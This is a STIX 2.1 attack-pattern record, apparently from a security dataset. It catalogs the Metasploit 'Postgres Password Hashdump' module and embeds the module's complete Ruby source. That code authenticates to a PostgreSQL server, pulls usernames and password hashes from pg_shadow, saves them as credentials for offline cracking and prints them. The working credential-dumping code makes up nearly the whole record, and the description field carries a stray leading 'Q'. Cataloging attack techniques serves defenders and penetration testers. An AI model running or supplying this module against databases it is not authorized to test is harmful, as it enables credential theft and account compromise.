{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94d27db3-0ae2-40ab-8c30-a293e82af522",
    "created": "2024-08-14T16:31:22.613915Z",
    "modified": "2024-08-14T16:31:22.613919Z",
    "name": "Postgres Password Hashdump",
    "description": "Q This module extracts the usernames and encrypted password hashes from a Postgres server and stores them for later cracking. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/postgres/postgres_hashdump.rb",
            "external_id": "postgres_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Postgres\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Postgres Password Hashdump',\n      'Description'    => %Q{\n          This module extracts the usernames and encrypted password\n        hashes from a Postgres server and stores them for later cracking.\n      },\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n    register_options([\n      OptString.new('DATABASE', [ true, 'The database to authenticate against', 'postgres']),\n      ])\n    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')\n\n  end\n\n  def run_host(ip)\n\n    # Query the Postgres Shadow table for username and password hashes and report them\n    res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)\n\n    service_data = {\n        address: ip,\n        port: rport,\n        service_name: 'postgres',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        module_fullname: self.fullname,\n        origin_type: :service,\n        private_data: datastore['PASSWORD'],\n        private_type: :password,\n        username: datastore['USERNAME'],\n        realm_key:  Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,\n        realm_value: datastore['DATABASE']\n    }\n\n    credential_data.merge!(service_data)\n\n    # Error handling routine here, borrowed heavily from todb\n    case res.keys[0]\n    when :conn_error\n      print_error(\"A Connection Error Occurred\")\n      return\n    when :sql_error\n      # We know the credentials worked but something else went wrong\n      credential_core = create_credential(credential_data)\n      login_data = {\n          core: credential_core,\n          last_attempted_at: DateTime.now,\n          status: Metasploit::Model::Login::Status::SUCCESSFUL\n      }\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n      case res[:sql_error]\n      when /^C42501/\n        print_error \"#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - Insufficient permissions.\"\n        return\n      else\n        print_error \"#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - #{res[:sql_error]}\"\n        return\n      end\n    when :complete\n      credential_core = create_credential(credential_data)\n      login_data = {\n          core: credential_core,\n          last_attempted_at: DateTime.now,\n          status: Metasploit::Model::Login::Status::SUCCESSFUL\n      }\n      login_data.merge!(service_data)\n      # We know the credentials worked and have admin access because we got the hashes\n      login_data[:access_level] = 'Admin'\n      create_credential_login(login_data)\n      print_good(\"Query appears to have run successfully\")\n    end\n\n\n    tbl = Rex::Text::Table.new(\n      'Header'  => 'Postgres Server Hashes',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Hash']\n    )\n\n    service_data = {\n        address: ::Rex::Socket.getaddress(rhost,true),\n        port: rport,\n        service_name: 'postgres',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        origin_type: :service,\n        jtr_format: 'raw-md5,postgres',\n        module_fullname: self.fullname,\n        private_type: :postgres_md5\n    }\n\n    credential_data.merge!(service_data)\n\n\n    res[:complete].rows.each do |row|\n      next if row[0].nil? or row[1].nil?\n      next if row[0].empty? or row[1].empty?\n      password = row[1]\n\n      credential_data[:username]     = row[0]\n      credential_data[:private_data] = password\n\n      credential_core = create_credential(credential_data)\n      login_data = {\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n      }\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n      tbl << [row[0], password]\n    end\n    print_good(\"#{tbl.to_s}\")\n\n  end\n\nend\n"
}